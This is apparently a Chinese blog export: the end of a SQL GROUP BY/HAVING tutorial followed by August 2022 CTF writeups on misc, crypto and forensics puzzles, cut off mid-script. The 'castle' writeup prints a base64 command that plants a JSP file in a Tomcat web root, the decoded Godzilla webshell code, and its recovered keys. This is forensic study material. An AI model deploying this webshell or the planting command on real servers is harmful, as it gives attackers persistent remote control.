class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ... <span class="keyword">from</span> ... <span class="keyword">group</span> <span class="keyword">by</span> 列名,列名</span><br></pre></td></tr></table></figure><h4 id="having"><a href="#having" class="headerlink" title="having"></a>having</h4><p>having和group by一起使用，用法和where一模一样，where怎么使用having就怎么使用，where不能使用的，having也可以使用</p><p>比如说where后面不可以使用聚合函数，但是在having后面可以使用聚合函数。</p><h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><h5 id="一、关于group-by-和having一起使用的规则"><a href="#一、关于group-by-和having一起使用的规则" class="headerlink" title="一、关于group by 和having一起使用的规则"></a>一、关于group by 和having一起使用的规则</h5><p>语法：group by 列名 having 条件</p><blockquote><p>分组之后加过滤条件。</p></blockquote><p><strong>开发中什么情况下使用分组？</strong>当在需求中遇到<strong>每种，每个</strong>等字眼的时候就使用分组。</p><h5 id="二、where-和-having-的区别。"><a href="#二、where-和-having-的区别。" class="headerlink" title="二、where 和 having 的区别。"></a>二、where 和 having 的区别。</h5><p>（1）having 通常与group by 分组结合使用。 where 和分组无关。</p><p>（2）having是从筛选出来的字段再筛选，而where是从数据表中的字段直接进行的筛选的。</p><p>（3）where 后面的条件可以写在having 中，但是 having中的条件不一定能写在where中。</p><p>（4）having 可以书写聚合函数 (聚合函数出现的位置： having 之后)</p><blockquote><p>例如having中的 聚合函数（count，sum，avg，max，min），是不可以出现where条件中。    </p></blockquote><p>（5）where 是在分组之前进行过滤的。having 是在分组之后进行过滤的。</p><h5 id="sql语句顺序SFWGHO"><a href="#sql语句顺序SFWGHO" class="headerlink" title="sql语句顺序SFWGHO"></a>sql语句顺序SFWGHO</h5><p>查询关键字的出现的顺序是固定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select（要显示的内容）from（表名）where（条件）group by（分组的列）having（分组后的条件）order by（排序）</span><br></pre></td></tr></table></figure><p><strong>查询语句可以省略 但是顺序不能变</strong></p><p>比如 将分组省略 having 跟在 where后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select …5… from …1… where …2… group by …3…having …4… order by .6.</span><br></pre></td></tr></table></figure><h5 id="查询的执行顺序："><a href="#查询的执行顺序：" class="headerlink" title="查询的执行顺序："></a>查询的执行顺序：</h5><p>1）from : 表名</p><p>2）where：条件过滤</p><p>3）group by : 分组</p><p>4）having ： 分组之后进行过滤。</p><p>5）select ：执行完毕之后，显示内容。</p><p>6）order by ： 根据查询的内容进行排序 （asc升序，desc 降序，默认降序）</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年8月比赛writeups</title>
      <link href="/article/2022-09-01-2022%E5%B9%B48%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/"/>
      <url>/article/2022-09-01-2022%E5%B9%B48%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/</url>
      
        <content type="html"><![CDATA[<p>主要记录一下2022年8月的一些比赛的解题思路。</p><span id="more"></span><h1 id="2022年8月比赛writeups"><a href="#2022年8月比赛writeups" class="headerlink" title="2022年8月比赛writeups"></a>2022年8月比赛writeups</h1><h2 id="网鼎杯-白虎"><a href="#网鼎杯-白虎" class="headerlink" title="网鼎杯-白虎"></a>网鼎杯-白虎</h2><p><a href="/image/media/2022/ctf/2022.08/%E7%99%BD%E8%99%8E.zip">2022网鼎杯白虎</a></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="sqlmapHell"><a href="#sqlmapHell" class="headerlink" title="sqlmapHell"></a>sqlmapHell</h4><p>爆破压缩包密码得到密码：99114514</p><p>解压得到flag.7z和sys_account.csv，前者需要密码，后者打开是数据表，其中password列是<code>7EqufFnrSGk=</code>，进行base64解密后转换为hex即可得到ec4aae7c59eb4869，解密md5，得到压缩包的密码nmy0612，得到flag的文本，是一串韩文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">웬후ퟳ듳삨뫅뗘뛾튻튻뛾뻅뛾죽룜웟냋뗘쇹룜쯄쇣쇹쯄룜뻅웟웟쾸룜뇘웟죽뛾뻅웟뗘쾸쯄쯄뻅튻폒듳삨뫅</span><br></pre></td></tr></table></figure><p>使用cyberchef的text encoding brute force的decode，在ISO 2022 Simplified Chinese (50227)编码下，得到flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">旗帜左大括号地二一一二九二三杠七八地六杠四零六四杠九七七细杠必七三二九七地细四四九一右大括号</span><br></pre></td></tr></table></figure><p>改成数字即为:<code>flag&#123;d2112923-78d6-4064-977c-b73297dc4491&#125;</code></p><h4 id="tHXcode"><a href="#tHXcode" class="headerlink" title="tHXcode"></a>tHXcode</h4><p>拿到附件先修复文件头，之后发现是png，文件头丢失，直接在最前面添加89504e47，然后修改后缀名，打开图片是个二维码，扫码只有一个连接没什么有用信息，直接用stegsolve查看通道，发现在0通道和1通道的信息不一样，于是保存两张图片异或信息，四角缺失，很像十字架，又跟二维码差不多，联想到缺了角的汉信码，于是将点所代表的的地方涂黑，然后p上二维码的四个角，中国编码扫码即可。</p><h4 id="一个人自己的房间"><a href="#一个人自己的房间" class="headerlink" title="一个人自己的房间"></a>一个人自己的房间</h4><p>下载附件，解压需要密码，winhex查看加密标识处，猜测是伪加密，考虑将标识处的09改为00，解压成功，得到一个自己的房间.bmp，查看lsb通道，发现大量0和1，长度正好是108900，开方之后是330，猜测是二维码形式的文件，save为bin，删除后面多余的内容，使用以下exp得到一张二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">330</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;[data..]&quot;</span><span class="comment">#此处是0和1的内容</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到一张四角打乱的二维码，保存下来，分割成4份，使用ppt拼起来扫描得到flag</p><h2 id="网鼎杯-青龙"><a href="#网鼎杯-青龙" class="headerlink" title="网鼎杯-青龙"></a>网鼎杯-青龙</h2><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="crypto091"><a href="#crypto091" class="headerlink" title="crypto091"></a>crypto091</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小A鼓起勇气向女神索要电话号码，但女神一定要考考他。女神说她最近刚看了一篇发表于安全顶会USENIX Security 2021的论文，论文发现苹果AirDrop隔空投送功能的漏洞，该漏洞可以向陌生人泄露AirDrop发起者或接收者的电话号码和电子邮箱。小A经过一番努力，获得了女神手机在AirDrop时传输的手机号哈希值，但再往下就不会了，你能继续帮助他吗？小A只记得女神手机号是170号段首批放号的联通号码。</span><br><span class="line">Hash：c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc</span><br><span class="line">flag格式：flag&#123;13位电话号码（纯数字，含国家代码）&#125;</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>百度搜索170联通号段得到1709，并且第一位国家代码是86，现有信息861709和剩下几位可以使用爆破，爆破脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">kay=&quot;c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc&quot;</span><br><span class="line">for i in range(1,10000000):</span><br><span class="line">    flag = 8617090000000</span><br><span class="line">    phone=flag+i</span><br><span class="line">    sha=hashlib.sha256(str(phone).encode()).hexdigest()</span><br><span class="line">    if sha==kay:</span><br><span class="line">        print(phone)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h2 id="观安杯"><a href="#观安杯" class="headerlink" title="观安杯"></a>观安杯</h2><p><a href="/image/media/2022/ctf/2022.08/%E8%A7%82%E5%AE%89%E6%9D%AF.zip">2022观安杯</a></p><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="DISG"><a href="#DISG" class="headerlink" title="DISG"></a>DISG</h4><ul><li>思路</li></ul><p>首先使用FTK Imager进行镜像挂载</p><p>file —&gt;   imgae mounting —&gt; 选择imag file —&gt; 点击Mount之后会看到多出来一块磁盘</p><p>（上述操作可能会涉及到一个读写权限：将mouunt method的权限换成Block device/Writable）</p><p>然后使用DiskGenius64做磁盘分析，选择刚刚新增的磁盘分区进行分析找到</p><p>新增磁盘下的:$RECYCLE.BIN\S-1-5-21-87142730-3356978945-767715265-500有个docx文件</p><p>复制出来然后打开里面的图片删除即可拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;v0kdk30g9lfif&#125;</span><br></pre></td></tr></table></figure><h4 id="castle"><a href="#castle" class="headerlink" title="castle"></a>castle</h4><ul><li>思路</li></ul><p>首先使用Wireshark流量分析在tcp.stream eq 197开始有加密数据传输，使用BlueTeam_ABC_123.jar分析拿到部分解密数据在tcp.stream eq 202中发现写进去的马，并且使用base64加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyBINHNJQUZ2Zi9XSUMvN1ZXYTIvYk5oVDlLNXlBQUNRbUVFbmFCR3RWcllpVERDaTJyQzNjWWdHR2ZhQ29hMXVkWGlPcFJLN2cvOTdMaHh3N3NkTzFSVDRrb3Noekw4ODlQT0wxcTRPZnlOU29vcDZUWHFiUk0za0toOWt2NG9VOE9qaytmaTZpWkZ4dGhkWnBaUC9melZYNVNZcC8xTTcrM0V1V0VGbmlrRndUNkEzVXVTYm45djJQUnVTZ2hyYkx5a0tTYTdveFNUNnpRWGN0S1BxWkphdUFjT3ZrUGMyV0J2NytoOGlNRFFwTXAycmlvRHlIV1ZHRFExR1p4ZVF3Umd3dm9aNmJCV1loWTU0UTM0K0pkSncxVFFtaUpoVWJpRkhMNFpPNEVUMlhhdG1haHA4WDdRSVp5WFRITEorRGVWTnJJMm9KTkRxN25FWXNrYnlvQzBPcjEwY3ZqK01hYnNsV25HNUI4aWxJWlA0N0xLZjRSbnRwMDB5UWpLWXM5bGxZRWtxVFBHOStLMnBSVW8wNnJxUXdja0hvWlMraE5VVlRFMWlMVUhkbGlZZ1ZDV1VpSzRPUHV6T2hZYWdaR2NJUVEwbnFJN0Z1NGdybkdtU25DclBrVjZDMW1NTkZNUWR0U0pWVWlIMEVzUzNHMWNVSmlsSHhyczJGQWFvM2E3UkhvOFBKVUYrcnBSRzA0cFV3Q3o0cDVtOXFBM1Awd0ZGTUtwNjdQUkROVGVQWjA2TlQrL0t4eGNNL0Z4cW9QZVFkQXBGaEZTVENCeXEwVzZBTU01dyt2NnhsazhQb2pBeWxNZ3ZWM0dweWwzRHdQdlQ0SkVUZmlMS0RMU245ZXVyQWZOYW9QMFdGcXJqNk9sT1VmT0xXVWFLMzJTZVFodmlkRmVid2tWYXZLekNMSnFjUkRzTnlGTHN0R0hyc3B2a1hpVHBzbUV4R0Z1R2tXUWl5cWZ4bndUYXpnbHY5RU5TMG1mRUFIQTVMSDhKbnd2Mm51MXJ2R0hKNnRPZnU0UmEwN3dDY0ltUzNKTHFyZVZWb3lTZG4wOHZ4QkJRS1EvWXBnenV2Zllhdzc2bjY2YW85dG40YkRlZW9QYlRjYUM5WHpnVTR5NDAyL0xybFF2U1BXeTZIUnkzbmlmMWZ5M2xXTE9UY0k3NWZmU0Mrci8yQitDSFhrMWx0TFBET2FnOFUyV2UxYjZoMjBzMW1Yc1ducVhtbjRRNStmWFZnTzFud0NsN0JJdDJ5bTRML3VuQm52eE1LMVRGNDBkcUdqZGV4US9mVVBtSXlFNlVHbGhRelFqWGU5cmlsalRrelNEL3I4R0xIM3I4c3NXbEhMRTJkSllZUnBuZkNYRXU4cG1aUjZIdXliZlIvZTgyL2R3U1F6Z3FRd1RBU3ZwODFjTmRSN09DSnMzdlJjTnRyenBRU3k3ZWRhVHVEY29Pb2lGQUszOU4xcTlrSHBPdVBaSlpTLzh1RWZhVjhkczhzTTQ2TVVUenE5OXlZYUxGbG5qZlkzSHBqZTU5dW0xcURUZnNYTmxWYlBMKzFBNG85bStzdTA3N2JIY2JZNzJ5V2RmOTdOSGlybi9XQkJNYXV5N1Y5MktnT0dQc0dFbzdDYXZmdkVEVGRGM0J4WlFJM0NnQUEgfGJhc2U2NCAtZHxnemlwIC1kID4gL3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL2xvZ291dC5qc3A=</span><br></pre></td></tr></table></figure><p>base64解密之后看起来是一个echo命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo H4sIAFvf/WIC/7VWa2/bNhT9K5yAACQmEEnaBGtVrYiTDCi2rC3cYgGGfaCoa1udXiOpRK7g/97Lhxw7sdO1RT4koshzL889POL1q4OfyNSoop6TXqbRM3kKh9kv4oU8Ojk+fi6iZFxthdZpZP/fzVX5SYp/1M7+3EuWEFnikFwT6A3UuSbn9v2PRuSghrbLykKSa7oxST6zQXctKPqZJauAcOvkPc2WBv7+h8iMDQpMp2rioDyHWVGDQ1GZxeQwRgwvoZ6bBWYhY54Q34+JdJw1TQmiJhUbiFHL4ZO4ET2Xatmahp8X7QIZyXTHLJ+DeVNrI2oJNDq7nEYskbyoC0Or10cvj+MabslWnG5B8ilIZP47LKf4Rntp00yQjKYs9llYEkqTPG9+K2pRUo06rqQwckHoZS+hNUVTE1iLUHdliYgVCWUiK4OPuzOhYagZGcIQQ0nqI7Fu4grnGmSnCrPkV6C1mMNFMQdtSJVUiH0EsS3G1cUJilHxrs2FAao3a7RHo8PJUF+rpRG04pUwCz4p5m9qA3P0wFFMKp67PRDNTePZ06NT+/KxxcM/FxqoPeQdApFhFSTCByq0W6AMM5w+v6xlk8PojAylMgvV3Gpyl3DwPvT4JETfiLKDLSn9eurAfNaoP0WFqrj6OlOUfOLWUaK32SeQhvidFebwkVavKzCLJqcRDsNyFLstGHrspvkXiTpsmExGFuGkWQiyqfxnwTazglv9ENS0mfEAHA5LH8Jnwv2nu1rvGHJ6tOfu4Ra07wCcImS3JLqreVVoySdn08vxBBQKQ/YpgzuvfYaw76n66ao9tn4bDeeoPbTcaC9XzgU4y402/LrlQvSPWy6HRy3nif1fy3lWLOTcI75ffSC+r/2B+CHXk1ltLPDOag8U2We1b6h20s1mXsWnqXmn4Q5+fXVgO1nwCl7BIt2ym4L/unBnvxMK1TF40dqGjdexQ/fUPmIyE6UGlhQzQjXe9riljTkzSD/r8GLH3r8ssWlHLE2dJYYRpnfCXEu8pmZR6HuybfR/e82/dwSQzgqQwTASvp81cNdR7OCJs3vRcNtrzpQSy7edaTuDcoOoiFAK39N1q9kHpOuPZJZS/8uEfaV8ds8sM46MUTzq99yYaLFlnjfY3Hpje59um1qDTfsXNlVbPL+1A4o9m+su077bHcbY72yWdf97NHirn/WBBMauy7V92KgOGPsGEo7CavfvEDTdF3BxZQI3CgAA |base64 -d|gzip -d &gt; /usr/local/tomcat/webapps/ROOT/logout.jsp</span><br></pre></td></tr></table></figure><p>tips可以修改一下后面的路径就能直接在Linux中看到这个马的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%部分代码被杀掉了%&gt; </span><br></pre></td></tr></table></figure><p>看一下关键信息，拿到了一个密码和一个XS值可以根据这两个信息猜测是个哥斯拉的马并根据前面的一些流量可以看到漏洞估计是Apache Shiro550反序列化(CVE-2016-4437)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;;</span><br></pre></td></tr></table></figure><p>然后结合DecodertoWebshell_1.2.jar工具解密哥斯拉流量，其中密钥key为3c6e0b8a9c15224a，密码pwd为pass</p><p>然后去后面寻找pass=开头的协议和数据，在tcp.stream eq 204的时候发现下面这段数据解密出来是个密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3UAFkPyuib0s8o70C5WxZ%2BPuwwqvopE8Ers8Ee176iSLmiyLiEL4yMpNM8Ytf8XK3lMRYzt6rh8kNGTjrAxKilWNdV5gX1vFLDcgGE2Roe9%2BfHDZQC7pHu3R%2BBf9vxWJ4rN3amilwKp5LcPOzGDISc0KMQP1ilPNu8b7ODrPB3S4a1ORPYBZcjA5LlpDtsq3bniXmkoSQ1QuG4wCNV8KQ%3D%3D</span><br></pre></td></tr></table></figure><p>解密结果，分析在整个过程中更换了密码，新的密钥为57e7bebdf2501f02，密码为supersuperpassword</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path=/index.html</span><br><span class="line">secretKey=57e7bebdf2501f02</span><br><span class="line">evalClassName=org.apache.coyote.ser.std.SerializableSerializer</span><br><span class="line">methodName=run</span><br><span class="line">pwd=supersuperpassword</span><br></pre></td></tr></table></figure><p>然后找到最后一个流量响应包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4611012B612C3BAEPHCNu5r7f03UZyZQ5gQIbjDUiDIV3stT2ZcFdJ93TLGhwtWGNkxIaVxiqBTwpqYoGA6ZJz8w/UD9h2A0vwpkyA==C9331C0E8C9FA966</span><br></pre></td></tr></table></figure><p>使用新的密钥为57e7bebdf2501f02，密码为supersuperpassword解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">响应流量解密之后：flag&#123;d3447f48-2691-4665-a1e3-3b281d56409e&#125;</span><br></pre></td></tr></table></figure><ul><li>工具下载</li></ul><p><a href="/image/media/2022/ctf/2022.08/img/%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.zip">木马流量分析工具</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/minhangxiaohui/DecodeSomeJSPWebshell/releases/tag/v1.2</span><br></pre></td></tr></table></figure><h2 id="长城杯"><a href="#长城杯" class="headerlink" title="长城杯"></a>长城杯</h2><p><a href="/image/media/2022/ctf/2022.08/%E9%95%BF%E5%9F%8E%E6%9D%AF.zip">2022长城杯</a></p><h3 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h3><h4 id="办公室爱情"><a href="#办公室爱情" class="headerlink" title="办公室爱情"></a>办公室爱情</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">办公室里出现了爱情关系，作为旁观者，我们知道了沃德喜欢皮迪符，沃德对他的爱分为外在和内在两部分。皮迪符心里只包含了皮皮特，但是我们不知道皮皮特的内心，请你一起来看看皮皮特的心里有谁。</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>在word的word–&gt;document.xml找到密码的两部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password1:True_lOve_</span><br><span class="line">password12:i2_supReMe</span><br><span class="line">True_lOve_i2_supReMe</span><br></pre></td></tr></table></figure><p>然后作为pdf隐写的密码（True_lOve_i2_supReMe）去用wbStego4.3解密PDF，得到this_is_pAssw0rd@!是压缩包的密码</p><p>然后根据彩虹7色，知道是7进制，白色不要，红橙黄绿青蓝紫的顺序对应0-6</p><p>204 213 166 205 234 100 626203164203231124203100164454545236</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;204a213a166a205a234a100a66a226a203a164a203a231a124a203a100a164a45a45a45a236a&#x27;</span><br><span class="line">for i in s.split(&#x27;a&#x27;):</span><br><span class="line">print(chr(int(i,7)),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>然后在线直接转换得到flag{10ve_exCe1_!!!}</p><h2 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h2><p><a href="/image/media/2022/ctf/2022.08/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2.zip">2022巅峰极客</a></p><h3 id="misc-3"><a href="#misc-3" class="headerlink" title="misc"></a>misc</h3><h4 id="powerpower"><a href="#powerpower" class="headerlink" title="powerpower"></a>powerpower</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明的电脑被hack了，并且hacker恶意修改了他的系统注册表，你能找到被修改的地方吗</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>使用registry workshop打开注册表文件找到下面两个表项和值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\DFS, , $enc_Secret=76492d1116743f0423413b16050a5345MgB8AFQAegB3AFAAaAArAFcAVABwAEYAWABLAGoAUwBaAEsAQQBvAHAAagBrAFEAPQA9AHwAOABmADIAOQBmADkANgA4ADkAMABlADIAZgBmADgAMwA0AGEAYwAxADIAMgA5ADYAZgAyADMAMQBiAGEANAA2ADUAOQAxADEANgAyADUANwA2AGEAMgBkAGYANQBjAGQAYwA5ADQAMgAyAGMANgBiADIAYwA5ADEANgA3ADkAZgA1AGUAMgA5ADYANQAyADEAOAA1ADMAYwAyADcAZABhADAAZgA2AGQAOQA0AGEAOAA2ADEAMQA4ADIAZgBhADgAMwBjAGYAMwBmAGEAMQAwADYANQBmADIANwA0AGYANgAxADIAZAA5ADYANgBjAGQANQBkADAAOQA4AGEAMgAwADYAYQA5ADgAMgBkADkANABlAGEANABmADEAMAA0ADEAMQA4ADcAOABlADcAYQBmADQAMQBiADQAMgBmADEANwA=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared, , JFNlY3JldCA9ICd4eHh4eHh4eHh4eHh4eHgnCiRQYXNzcGhyYXNlID0gKEdldC1JdGVtUHJvcGVydHkgLVBhdGggYWFhYTpcU09GVFdBUkVcTWljcm9zb2Z0XEJpZEludGVyZmFjZSkKCiRrZXkgPSBbQnl0ZVtdXSgkUGFzc3BocmFzZS5QYWRSaWdodCgyNCkuU3Vic3RyaW5nKDAsMjQpLlRvQ2hhckFycmF5KCkpCgokU2VjcmV0IHwKICBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1Bc1BsYWluVGV4dCAtRm9yY2UgfCAKICBDb252ZXJ0RnJvbS1TZWN1cmVTdHJpbmcgLUtleSAka2V5IHwgCgo=</span><br></pre></td></tr></table></figure><p>经过base64解密之后看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$Secret = &#x27;xxxxxxxxxxxxxxx&#x27;</span><br><span class="line">$Passphrase = (Get-ItemProperty -Path aaaa:\SOFTWARE\Microsoft\BidInterface)</span><br><span class="line">$key = [Byte[]]($Passphrase.PadRight(24).Substring(0,24).ToCharArray())</span><br><span class="line">$Secret |</span><br><span class="line">  ConvertTo-SecureString -AsPlainText -Force | </span><br><span class="line">  ConvertFrom-SecureString -Key $key | </span><br></pre></td></tr></table></figure><p>百度搜到ConvertTo-SecureString相关参考文档得到解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 